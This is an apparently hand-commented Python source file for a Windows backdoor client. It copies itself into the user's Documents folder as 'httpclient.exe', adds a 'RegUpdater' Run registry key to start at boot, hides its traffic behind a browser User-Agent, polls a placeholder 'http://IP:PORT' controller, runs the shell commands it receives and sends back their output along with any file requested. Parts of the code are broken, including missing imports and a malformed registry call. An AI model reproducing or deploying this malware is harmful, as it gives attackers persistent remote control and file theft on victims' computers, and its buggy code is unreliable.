import subprocess
import time
import shutil #high level file service
import winreg as wreg #windows registry editing service
import random

path = os.getcwd().strip('/n') #print current working directory and remove space at the end of the string

Null, userprof = subprocess.check_output('set USERPROFILE', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode().split('=')
#^ used to get userprofile so we can move to the document directory, we strip the function to only get the profile so we can use it as a
# variable to copy the file to the documents destination

destination = (userprof.strip('\n\r') +"\\Documents\\"+'httpclient.exe') #strip the newline space and empty line to get only the user, then append the
#new path you want the file to copy to followed by the file name
destination = destination
#reconnaisence phase completed

if not os.path.exists(destination): #if the above mentioned path doesn't exist then:
    shutil.copyfile(path+'\httpclient.exe',destination) #copy the file from the current directory and paste it to the desitnation
    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\CurrentVersion\Run",wreg.SetValueEx(key,'RegUpdater', 0, wreg.REG_SZ, desitnation))
#^ Add a registry key to the user space (allows for the script to work without root)
# The new registry key is named "RegUpdater" and is poiting its value to the destination where the exe is stored
#^ Runs the script on boot
    key.close()
def connect():
    while True:
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"}
        req = requests.get('http://IP:PORT',headers=headers)
        command = req.text

        if 'exit' in command:
            return 1 #since there are two infinite loops we need to exit both so we will get this condiiton to output a specific value
        elif 'grab' in command:
            grab, path = command.split('*')
            if os.path.exists(path):
                url = "http://IP:PORT/store" #/store helps indicate that this is a file transfer and not an output
                files = {"file": open(path,'rb')} #dictionary with a key called "file" with a value of the file object which is the acc file
                r = requests.post(url, files=files, headers=headers)
            else:
                post_response = requests.post(url="http://IP:PORT",headers=headers,data="[-] File Not found")
        else:
            CMD = subprocess.Popen(command,shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
            post_response = requests.post(url='http://IP:PORT', data=CMD.stdout.read(), headers=headers)
            post_response = requests.post(url='http://IP:PORT', data=CMD.stderr.read(), headers=headers)
        time.sleep(3)

#we turn the connection into the function to allow ourselves unlimited access
#if the client script starts and the server isnt listening, it will raise an expection
# in the infinite loop we command our client to wait for a certain amount of seconds between 1 to 10
#before passing the exception and attempting to connect again, this way if the connection is not made
# the device will attempt to connect every few seconds and when the server does listen, we'll have a connection
while True:
    try:
        if connect()== 1: #if the outputed specific value by the def function is 1 like it should be
            break #when the code breaks then break the second loop aswell and stop listening 
    except:
        sleep_for = random.randrange(1,10)
        time.sleep(int(sleep_for))
        pass

